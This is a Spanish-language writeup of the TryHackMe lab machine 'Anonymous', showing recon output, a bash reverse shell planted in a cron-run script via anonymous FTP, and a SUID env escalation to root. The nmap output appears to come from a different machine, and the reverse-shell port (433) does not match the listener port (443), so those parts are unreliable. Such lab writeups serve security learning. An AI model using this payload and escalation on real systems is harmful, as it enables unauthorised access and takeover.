---
layout: post
title:  "Maquina Anonymous de TryHackMe (No necesario VIP)"
description: En esta ocasion empezaremos con el Writeup de la maquina de TryHackMe llamada ANONYMOUS
tags: TryHackMe, Ftp, Smb, CurlFtp, Web Hacking, , SUID, Writeup, 
---

# Anonymous ~ TryHackMe

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.64.76       "
``` 
Procedemos con el siguiente escaneo de Nmap
```bash
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 63							--comprobando		nada encontrado
22/tcp   open  ssh          syn-ack ttl 63
139/tcp  open  netbios-ssn  syn-ack ttl 63
445/tcp  open  microsoft-ds syn-ack ttl 63
3632/tcp open  distccd      syn-ack ttl 63

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4										-comprobando version
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.193
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h01m27s, deviation: 2h49m45s, median: 1m24s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-05-03T17:06:20-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```
Procedemos con la enumeracion del servicio `FTP` como el usuario `Anonymous` sin proporcionar contraseña.
Encontramos un directorio que almacena 3 archivos:
```bash
# ls -l FTP 
total 12
-rw-r--r-- 1 root root  314 jun  1 20:33 clean.sh
-rw-r--r-- 1 root root 1032 jun  1 20:33 removed_files.log
-rw-r--r-- 1 root root   68 jun  1 20:33 to_do.txt
```
Vemos que una tarea `CRON` esta ejecutando el script `clean.sh` para limpiar los archivos temporales.

Procedemos a lanzar la herramienta `enum4linux`:
```bash
# enum4linux 10.10.64.76                                                                                                                             1 ⨯
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Jun  1 20:56:10 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.64.76
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =================================================== 
|    Enumerating Workgroup/Domain on 10.10.64.76    |
 =================================================== 
[+] Got domain/workgroup name: WORKGROUP

 =========================================== 
|    Nbtstat Information for 10.10.64.76    |
 =========================================== 
Looking up status of 10.10.64.76
        ANONYMOUS       <00> -         B <ACTIVE>  Workstation Service
        ANONYMOUS       <03> -         B <ACTIVE>  Messenger Service
        ANONYMOUS       <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ==================================== 
|    Session Check on 10.10.64.76    |
 ==================================== 
[+] Server 10.10.64.76 allows sessions using username '', password ''

 ========================================== 
|    Getting domain SID for 10.10.64.76    |
 ========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ===================================== 
|    OS information on 10.10.64.76    |
 ===================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.64.76 from smbclient: 
[+] Got OS info for 10.10.64.76 from srvinfo:
        ANONYMOUS      Wk Sv PrQ Unx NT SNT anonymous server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ============================ 
|    Users on 10.10.64.76    |
 ============================ 
index: 0x1 RID: 0x3eb acb: 0x00000010 Account: namelessone      Name: namelessone       Desc: 

user:[namelessone] rid:[0x3eb]

 ======================================== 
|    Share Enumeration on 10.10.64.76    |
 ======================================== 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.64.76
//10.10.64.76/print$    Mapping: DENIED, Listing: N/A
//10.10.64.76/pics      Mapping: OK, Listing: OK
//10.10.64.76/IPC$      [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 =================================================== 
|    Password Policy Information for 10.10.64.76    |
 =================================================== 


[+] Attaching to 10.10.64.76 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] ANONYMOUS
        [+] Builtin

[+] Password Info for Domain: ANONYMOUS

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ============================= 
|    Groups on 10.10.64.76    |
 ============================= 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ====================================================================== 
|    Users on 10.10.64.76 via RID cycling (RIDS: 500-550,1000-1050)    |
 ====================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-2144577014-3591677122-2188425437
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\namelessone (Local User)
[+] Enumerating users using SID S-1-5-21-2144577014-3591677122-2188425437 and logon username '', password ''
S-1-5-21-2144577014-3591677122-2188425437-500 *unknown*\*unknown* (8)
S-1-5-21-2144577014-3591677122-2188425437-501 ANONYMOUS\nobody (Local User)

S-1-5-21-2144577014-3591677122-2188425437-513 ANONYMOUS\None (Domain Group)
)
S-1-5-21-2144577014-3591677122-2188425437-1003 ANONYMOUS\namelessone (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

 ============================================ 
|    Getting printer info for 10.10.64.76    |
 ============================================ 
No printers returned.

enum4linux complete on Tue Jun  1 21:00:04 2021
```
Vemos que nos arroja un monton de informacion entre ello un posible usuario  `ANONYMOUS\namelessone (Local User)`

EXPLOTACION INICIAL

Como veiamos en el servicio ftp se estaba ejecutando un script en bash para ir limpiando los archivos temporales
por lo que intuimos que hay una tarea CRON POR  DETRAS
```bash	
	PASO 1.-
"	# mkdir /mnt/ftp        "
	
	PASO 2.-
"	# curlftpfs anonymous:anonymous@10.10.64.76 /mnt/ftp      "
montamos un montura con el uso de curlftps el nombre del user, y entramos en la misma para modificar el archivo clean.sh 
para que cuando se ejecute nos devuelva una tarea Reverse_shell 

	PASO 3.-
"	# cd scripts            "
	
	PASO 4.-
"	# ls                    "
clean.sh  removed_files.log  to_do.txt

	PASO 5.-
	abrimos el “clean.sh”
"	
	#!/bin/bash
	
	bash -c ‘bash -i >& /dev/tcp/10.10.6.103/433 0>&1’
"	
	PASO 6.-
"	# nc -vlnp 443      "
```
Nos ponemos a la escucha para que la tarea `CRON` nos ejecute el script `clean.sh` modificado para que nos envie una `R_shell` y conseguir acceso a la maquina:
```bash
	# nc -vlnp 443
listening on [any] 443 ...
connect to [10.4.5.83] from (UNKNOWN) [10.10.64.76] 46308
bash: cannot set terminal process group (1809): Inappropriate ioctl for device
bash: no job control in this shell
" HACEMOS UN TRATAMIENTO DE LA TERMINAL  "
namelessone@anonymous:~$ "script /dev/null -c bash"
script /dev/null -c bash
Script started, file is /dev/null
namelessone@anonymous:~$" ^Z"
zsh: suspended  nc -vlnp 443
                                                                                                                                                           
┌──(root💀kali)-[/mnt/ftp/scripts]
└─#" stty raw -echo; fg "                                                                                                                          148 ⨯ 1 ⚙
[1]  + continued  nc -vlnp 443
                              "reset"
reset: unknown terminal type unknown
Terminal type? "xterm"
namelessone@anonymous:~$" export TERM=xterm"
namelessone@anonymous:~$" export SHELL=bash"
```
Recibimos la Shell como el user namelessone
Y ya podriamos sacar la flag del `user.txt`

# Escalada de Privilegios hasta el user Root

Listamos por permisos SUID
```bash
$ find / -perm -u=s -type f 2>/dev/null
..
/usr/bin/env
..
```
Este binario nos permite spawnearnos una consola tal que asi
```bash	
/usr/bin/env /bin/sh -p
```	
```bash
#whoami
root
```
Ya podriamos sacar la flag de `root.txt`

Sacamos la flag y ya estaria la maquina rooteada. =)

